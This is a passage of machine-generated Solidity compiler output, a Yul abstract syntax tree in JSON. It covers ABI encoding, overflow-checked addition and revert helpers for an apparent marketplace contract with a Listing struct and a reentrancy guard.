pos","nodeType":"YulIdentifier","src":"4287:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"4310:5:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"4292:17:15"},"nodeType":"YulFunctionCall","src":"4292:24:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"4280:6:15"},"nodeType":"YulFunctionCall","src":"4280:37:15"},"nodeType":"YulExpressionStatement","src":"4280:37:15"}]},"name":"abi_encode_t_uint256_to_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"4258:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"4265:3:15","type":""}],"src":"4215:108:15"},{"body":{"nodeType":"YulBlock","src":"4394:53:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"4411:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"4434:5:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"4416:17:15"},"nodeType":"YulFunctionCall","src":"4416:24:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"4404:6:15"},"nodeType":"YulFunctionCall","src":"4404:37:15"},"nodeType":"YulExpressionStatement","src":"4404:37:15"}]},"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"4382:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"4389:3:15","type":""}],"src":"4329:118:15"},{"body":{"nodeType":"YulBlock","src":"4641:191:15","statements":[{"nodeType":"YulAssignment","src":"4652:154:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"4802:3:15"}],"functionName":{"name":"abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack","nodeType":"YulIdentifier","src":"4659:141:15"},"nodeType":"YulFunctionCall","src":"4659:147:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"4652:3:15"}]},{"nodeType":"YulAssignment","src":"4816:10:15","value":{"name":"pos","nodeType":"YulIdentifier","src":"4823:3:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"4816:3:15"}]}]},"name":"abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"4628:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"4637:3:15","type":""}],"src":"4453:379:15"},{"body":{"nodeType":"YulBlock","src":"4992:288:15","statements":[{"nodeType":"YulAssignment","src":"5002:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5014:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"5025:2:15","type":"","value":"96"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5010:3:15"},"nodeType":"YulFunctionCall","src":"5010:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"5002:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"5082:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5095:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"5106:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5091:3:15"},"nodeType":"YulFunctionCall","src":"5091:17:15"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulIdentifier","src":"5038:43:15"},"nodeType":"YulFunctionCall","src":"5038:71:15"},"nodeType":"YulExpressionStatement","src":"5038:71:15"},{"expression":{"arguments":[{"name":"value1","nodeType":"YulIdentifier","src":"5163:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5176:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"5187:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5172:3:15"},"nodeType":"YulFunctionCall","src":"5172:18:15"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulIdentifier","src":"5119:43:15"},"nodeType":"YulFunctionCall","src":"5119:72:15"},"nodeType":"YulExpressionStatement","src":"5119:72:15"},{"expression":{"arguments":[{"name":"value2","nodeType":"YulIdentifier","src":"5245:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5258:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"5269:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5254:3:15"},"nodeType":"YulFunctionCall","src":"5254:18:15"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulIdentifier","src":"5201:43:15"},"nodeType":"YulFunctionCall","src":"5201:72:15"},"nodeType":"YulExpressionStatement","src":"5201:72:15"}]},"name":"abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"4948:9:15","type":""},{"name":"value2","nodeType":"YulTypedName","src":"4960:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"4968:6:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"4976:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"4987:4:15","type":""}],"src":"4838:442:15"},{"body":{"nodeType":"YulBlock","src":"5412:206:15","statements":[{"nodeType":"YulAssignment","src":"5422:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5434:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"5445:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5430:3:15"},"nodeType":"YulFunctionCall","src":"5430:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"5422:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"5502:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5515:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"5526:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5511:3:15"},"nodeType":"YulFunctionCall","src":"5511:17:15"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulIdentifier","src":"5458:43:15"},"nodeType":"YulFunctionCall","src":"5458:71:15"},"nodeType":"YulExpressionStatement","src":"5458:71:15"},{"expression":{"arguments":[{"name":"value1","nodeType":"YulIdentifier","src":"5583:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5596:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"5607:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5592:3:15"},"nodeType":"YulFunctionCall","src":"5592:18:15"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulIdentifier","src":"5539:43:15"},"nodeType":"YulFunctionCall","src":"5539:72:15"},"nodeType":"YulExpressionStatement","src":"5539:72:15"}]},"name":"abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"5376:9:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"5388:6:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"5396:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"5407:4:15","type":""}],"src":"5286:332:15"},{"body":{"nodeType":"YulBlock","src":"5778:288:15","statements":[{"nodeType":"YulAssignment","src":"5788:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5800:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"5811:2:15","type":"","value":"96"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5796:3:15"},"nodeType":"YulFunctionCall","src":"5796:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"5788:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"5868:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5881:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"5892:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5877:3:15"},"nodeType":"YulFunctionCall","src":"5877:17:15"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulIdentifier","src":"5824:43:15"},"nodeType":"YulFunctionCall","src":"5824:71:15"},"nodeType":"YulExpressionStatement","src":"5824:71:15"},{"expression":{"arguments":[{"name":"value1","nodeType":"YulIdentifier","src":"5949:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5962:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"5973:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5958:3:15"},"nodeType":"YulFunctionCall","src":"5958:18:15"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulIdentifier","src":"5905:43:15"},"nodeType":"YulFunctionCall","src":"5905:72:15"},"nodeType":"YulExpressionStatement","src":"5905:72:15"},{"expression":{"arguments":[{"name":"value2","nodeType":"YulIdentifier","src":"6031:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"6044:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"6055:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6040:3:15"},"nodeType":"YulFunctionCall","src":"6040:18:15"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulIdentifier","src":"5987:43:15"},"nodeType":"YulFunctionCall","src":"5987:72:15"},"nodeType":"YulExpressionStatement","src":"5987:72:15"}]},"name":"abi_encode_tuple_t_address_t_uint256_t_uint256__to_t_address_t_uint256_t_uint256__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"5734:9:15","type":""},{"name":"value2","nodeType":"YulTypedName","src":"5746:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"5754:6:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"5762:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"5773:4:15","type":""}],"src":"5624:442:15"},{"body":{"nodeType":"YulBlock","src":"6243:248:15","statements":[{"nodeType":"YulAssignment","src":"6253:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"6265:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"6276:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6261:3:15"},"nodeType":"YulFunctionCall","src":"6261:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"6253:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"6300:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"6311:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6296:3:15"},"nodeType":"YulFunctionCall","src":"6296:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"6319:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"6325:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"6315:3:15"},"nodeType":"YulFunctionCall","src":"6315:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"6289:6:15"},"nodeType":"YulFunctionCall","src":"6289:47:15"},"nodeType":"YulExpressionStatement","src":"6289:47:15"},{"nodeType":"YulAssignment","src":"6345:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"6479:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_25adaa6d082ce15f901e0d8a3d393e7462ef9edf2e6bc8321fa14d1615b6fc51_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"6353:124:15"},"nodeType":"YulFunctionCall","src":"6353:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"6345:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_25adaa6d082ce15f901e0d8a3d393e7462ef9edf2e6bc8321fa14d1615b6fc51__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"6223:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"6238:4:15","type":""}],"src":"6072:419:15"},{"body":{"nodeType":"YulBlock","src":"6668:248:15","statements":[{"nodeType":"YulAssignment","src":"6678:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"6690:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"6701:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6686:3:15"},"nodeType":"YulFunctionCall","src":"6686:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"6678:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"6725:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"6736:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6721:3:15"},"nodeType":"YulFunctionCall","src":"6721:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"6744:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"6750:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"6740:3:15"},"nodeType":"YulFunctionCall","src":"6740:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"6714:6:15"},"nodeType":"YulFunctionCall","src":"6714:47:15"},"nodeType":"YulExpressionStatement","src":"6714:47:15"},{"nodeType":"YulAssignment","src":"6770:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"6904:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"6778:124:15"},"nodeType":"YulFunctionCall","src":"6778:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"6770:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"6648:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"6663:4:15","type":""}],"src":"6497:419:15"},{"body":{"nodeType":"YulBlock","src":"7070:174:15","statements":[{"nodeType":"YulAssignment","src":"7080:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"7092:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"7103:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7088:3:15"},"nodeType":"YulFunctionCall","src":"7088:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"7080:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"7210:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"7223:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"7234:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7219:3:15"},"nodeType":"YulFunctionCall","src":"7219:17:15"}],"functionName":{"name":"abi_encode_t_struct$_Listing_$2632_memory_ptr_to_t_struct$_Listing_$2632_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"7116:93:15"},"nodeType":"YulFunctionCall","src":"7116:121:15"},"nodeType":"YulExpressionStatement","src":"7116:121:15"}]},"name":"abi_encode_tuple_t_struct$_Listing_$2632_memory_ptr__to_t_struct$_Listing_$2632_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"7042:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"7054:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"7065:4:15","type":""}],"src":"6922:322:15"},{"body":{"nodeType":"YulBlock","src":"7348:124:15","statements":[{"nodeType":"YulAssignment","src":"7358:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"7370:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"7381:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7366:3:15"},"nodeType":"YulFunctionCall","src":"7366:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"7358:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"7438:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"7451:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"7462:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7447:3:15"},"nodeType":"YulFunctionCall","src":"7447:17:15"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulIdentifier","src":"7394:43:15"},"nodeType":"YulFunctionCall","src":"7394:71:15"},"nodeType":"YulExpressionStatement","src":"7394:71:15"}]},"name":"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"7320:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"7332:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"7343:4:15","type":""}],"src":"7250:222:15"},{"body":{"nodeType":"YulBlock","src":"7518:35:15","statements":[{"nodeType":"YulAssignment","src":"7528:19:15","value":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"7544:2:15","type":"","value":"64"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"7538:5:15"},"nodeType":"YulFunctionCall","src":"7538:9:15"},"variableNames":[{"name":"memPtr","nodeType":"YulIdentifier","src":"7528:6:15"}]}]},"name":"allocate_unbounded","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nodeType":"YulTypedName","src":"7511:6:15","type":""}],"src":"7478:75:15"},{"body":{"nodeType":"YulBlock","src":"7672:34:15","statements":[{"nodeType":"YulAssignment","src":"7682:18:15","value":{"name":"pos","nodeType":"YulIdentifier","src":"7697:3:15"},"variableNames":[{"name":"updated_pos","nodeType":"YulIdentifier","src":"7682:11:15"}]}]},"name":"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"7644:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"7649:6:15","type":""}],"returnVariables":[{"name":"updated_pos","nodeType":"YulTypedName","src":"7660:11:15","type":""}],"src":"7559:147:15"},{"body":{"nodeType":"YulBlock","src":"7808:73:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7825:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"7830:6:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"7818:6:15"},"nodeType":"YulFunctionCall","src":"7818:19:15"},"nodeType":"YulExpressionStatement","src":"7818:19:15"},{"nodeType":"YulAssignment","src":"7846:29:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7865:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7870:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7861:3:15"},"nodeType":"YulFunctionCall","src":"7861:14:15"},"variableNames":[{"name":"updated_pos","nodeType":"YulIdentifier","src":"7846:11:15"}]}]},"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"7780:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"7785:6:15","type":""}],"returnVariables":[{"name":"updated_pos","nodeType":"YulTypedName","src":"7796:11:15","type":""}],"src":"7712:169:15"},{"body":{"nodeType":"YulBlock","src":"7931:261:15","statements":[{"nodeType":"YulAssignment","src":"7941:25:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"7964:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"7946:17:15"},"nodeType":"YulFunctionCall","src":"7946:20:15"},"variableNames":[{"name":"x","nodeType":"YulIdentifier","src":"7941:1:15"}]},{"nodeType":"YulAssignment","src":"7975:25:15","value":{"arguments":[{"name":"y","nodeType":"YulIdentifier","src":"7998:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"7980:17:15"},"nodeType":"YulFunctionCall","src":"7980:20:15"},"variableNames":[{"name":"y","nodeType":"YulIdentifier","src":"7975:1:15"}]},{"body":{"nodeType":"YulBlock","src":"8138:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nodeType":"YulIdentifier","src":"8140:16:15"},"nodeType":"YulFunctionCall","src":"8140:18:15"},"nodeType":"YulExpressionStatement","src":"8140:18:15"}]},"condition":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"8059:1:15"},{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"8066:66:15","type":"","value":"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"},{"name":"y","nodeType":"YulIdentifier","src":"8134:1:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"8062:3:15"},"nodeType":"YulFunctionCall","src":"8062:74:15"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"8056:2:15"},"nodeType":"YulFunctionCall","src":"8056:81:15"},"nodeType":"YulIf","src":"8053:107:15"},{"nodeType":"YulAssignment","src":"8170:16:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"8181:1:15"},{"name":"y","nodeType":"YulIdentifier","src":"8184:1:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"8177:3:15"},"nodeType":"YulFunctionCall","src":"8177:9:15"},"variableNames":[{"name":"sum","nodeType":"YulIdentifier","src":"8170:3:15"}]}]},"name":"checked_add_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nodeType":"YulTypedName","src":"7918:1:15","type":""},{"name":"y","nodeType":"YulTypedName","src":"7921:1:15","type":""}],"returnVariables":[{"name":"sum","nodeType":"YulTypedName","src":"7927:3:15","type":""}],"src":"7887:305:15"},{"body":{"nodeType":"YulBlock","src":"8243:51:15","statements":[{"nodeType":"YulAssignment","src":"8253:35:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"8282:5:15"}],"functionName":{"name":"cleanup_t_uint160","nodeType":"YulIdentifier","src":"8264:17:15"},"nodeType":"YulFunctionCall","src":"8264:24:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"8253:7:15"}]}]},"name":"cleanup_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"8225:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"8235:7:15","type":""}],"src":"8198:96:15"},{"body":{"nodeType":"YulBlock","src":"8345:81:15","statements":[{"nodeType":"YulAssignment","src":"8355:65:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"8370:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"8377:42:15","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"8366:3:15"},"nodeType":"YulFunctionCall","src":"8366:54:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"8355:7:15"}]}]},"name":"cleanup_t_uint160","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"8327:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"8337:7:15","type":""}],"src":"8300:126:15"},{"body":{"nodeType":"YulBlock","src":"8477:32:15","statements":[{"nodeType":"YulAssignment","src":"8487:16:15","value":{"name":"value","nodeType":"YulIdentifier","src":"8498:5:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"8487:7:15"}]}]},"name":"cleanup_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"8459:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"8469:7:15","type":""}],"src":"8432:77:15"},{"body":{"nodeType":"YulBlock","src":"8543:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"8560:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"8563:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"8553:6:15"},"nodeType":"YulFunctionCall","src":"8553:88:15"},"nodeType":"YulExpressionStatement","src":"8553:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"8657:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"8660:4:15","type":"","value":"0x11"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"8650:6:15"},"nodeType":"YulFunctionCall","src":"8650:15:15"},"nodeType":"YulExpressionStatement","src":"8650:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"8681:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"8684:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"8674:6:15"},"nodeType":"YulFunctionCall","src":"8674:15:15"},"nodeType":"YulExpressionStatement","src":"8674:15:15"}]},"name":"panic_error_0x11","nodeType":"YulFunctionDefinition","src":"8515:180:15"},{"body":{"nodeType":"YulBlock","src":"8790:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"8807:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"8810:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"8800:6:15"},"nodeType":"YulFunctionCall","src":"8800:12:15"},"nodeType":"YulExpressionStatement","src":"8800:12:15"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nodeType":"YulFunctionDefinition","src":"8701:117:15"},{"body":{"nodeType":"YulBlock","src":"8913:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"8930:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"8933:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"8923:6:15"},"nodeType":"YulFunctionCall","src":"8923:12:15"},"nodeType":"YulExpressionStatement","src":"8923:12:15"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulFunctionDefinition","src":"8824:117:15"},{"body":{"nodeType":"YulBlock","src":"9053:59:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"9075:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"9083:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"9071:3:15"},"nodeType":"YulFunctionCall","src":"9071:14:15"},{"hexValue":"5472616e73666572206661696c6564","kind":"string","nodeType":"YulLiteral","src":"9087:17:15","type":"","value":"Transfer failed"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"9064:6:15"},"nodeType":"YulFunctionCall","src":"9064:41:15"},"nodeType":"YulExpressionStatement","src":"9064:41:15"}]},"name":"store_literal_in_memory_25adaa6d082ce15f901e0d8a3d393e7462ef9edf2e6bc8321fa14d1615b6fc51","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"9045:6:15","type":""}],"src":"8947:165:15"},{"body":{"nodeType":"YulBlock","src":"9224:8:15","statements":[]},"name":"store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"9216:6:15","type":""}],"src":"9118:114:15"},{"body":{"nodeType":"YulBlock","src":"9344:75:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"9366:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"9374:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"9362:3:15"},"nodeType":"YulFunctionCall","src":"9362:14:15"},{"hexValue":"5265656e7472616e637947756172643a207265656e7472616e742063616c6c","kind":"string","nodeType":"YulLiteral","src":"9378:33:15","type":"","value":"ReentrancyGuard: reentrant 